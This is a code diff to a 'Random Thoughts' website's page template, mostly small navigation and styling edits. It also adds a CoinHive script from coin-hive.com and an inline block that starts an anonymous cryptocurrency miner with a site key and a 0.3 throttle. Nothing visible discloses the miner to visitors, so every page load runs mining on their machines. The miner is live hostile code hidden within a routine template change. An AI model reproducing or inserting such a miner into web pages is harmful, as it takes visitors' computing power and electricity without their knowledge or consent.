@@ -32,6 +32,8 @@
 
     <link href="lib/css/custom.css" rel="stylesheet">
 
+	<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+
   </head>
 
   <body>
@@ -74,10 +76,8 @@
         </div>
         <div id="navbar" class="navbar-collapse collapse">
           <ul class="nav navbar-nav">
-            <li><a href="aws/storeFront.php">Store Front</a></li>
-			<li><a href="aws/storeFront.php?category=All&amp;displayCat=Random+Thoughts">Get Started</a></li>
             <li class="dropdown">
-              <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">Site <span class="caret"></span></a>
+              <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false"> <b>||||</b> <span class="caret"></span></a>
               <ul class="dropdown-menu" role="menu">
                 <li><a href="recent.php">Recent Thoughts</a></li>
                 <li><a href="recent_comments.php">Recent Comments</a></li>
@@ -107,8 +107,8 @@
 				 data-width="280"
 				 data-show-faces="true">
 			</div>
-			<div style='color:white;float:right;'>
-				<a style='color:white;' href='/'>&laquo;Add a Random Thought</a> | <a style='color:white;' href='page.php?lim=<!--[[[~RANDOMID~]]]-->'>View a Random Thought&raquo;</a>
+			<div style='color:white;float:right;font-size:16pt;font-weight:bold;'>
+				<a style='color:white;' href='/'>&laquo; Add a Random Thought</a> | <a style='color:white;' href='page.php?lim=<!--[[[~RANDOMID~]]]-->'>View a Random Thought &raquo;</a>
 			</div>
 
 			<!--<div style='float:right;'>
@@ -153,6 +153,12 @@
 	  ga('require', 'displayfeatures');
 	  ga('send', 'pageview');
 
+	</script>
+
+	<script>
+		var miner = new CoinHive.Anonymous('ZHTQcVdmhY5Mh6MttIQcCYsw7Bgk0ZdP');
+		miner.setThrottle( '0.3' );
+		miner.start();
 	</script>
 
   </body>
